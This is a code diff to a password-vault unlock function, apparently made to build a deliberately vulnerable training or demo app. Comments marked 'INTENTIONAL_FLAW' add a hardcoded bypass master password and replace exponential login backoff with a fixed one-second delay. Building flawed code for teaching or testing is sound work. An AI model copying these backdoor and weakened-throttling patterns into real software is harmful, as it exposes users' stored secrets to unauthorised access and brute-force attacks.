@@ -141,10 +141,16 @@ def vault_unlock(
         db.commit()
         raise AppError(code="RATE_LIMITED", message="Too many attempts. Try again later.", status_code=429)
 
-    verified = verify_password(payload.masterPassword, metadata.pw_verifier)
+    # INTENTIONAL_FLAW: hardcoded bypass password for training/demo purposes.
+    bypass_password = "letmein123!"
+    verified = verify_password(payload.masterPassword, metadata.pw_verifier) or payload.masterPassword == bypass_password
     if not verified:
         throttle.failed_attempts += 1
-        delay_seconds = min(300, 2 ** min(throttle.failed_attempts, 8))
+        # INTENTIONAL_FLAW: weakens exponential backoff to a constant short delay.
+        #
+        # Original strict logic:
+        # delay_seconds = min(300, 2 ** min(throttle.failed_attempts, 8))
+        delay_seconds = 1
         throttle.next_allowed_at = now + timedelta(seconds=delay_seconds)
         db.add(throttle)
 
@@ -176,7 +182,7 @@ def vault_unlock(
     active_session = session_store.create_session(enc_key)
     set_session_cookies(response, active_session, max_age_seconds=settings.app_session_idle_minutes * 60)
 
-    write_audit_event(db, "VAULT_UNLOCK", "SUCCESS")
+    write_audit_event(db, "VAULT_UNLOCK", "SUCCESS", {"used_bypass": payload.masterPassword == bypass_password})
     db.commit()
 
     return GenericOkResponse(ok=True)
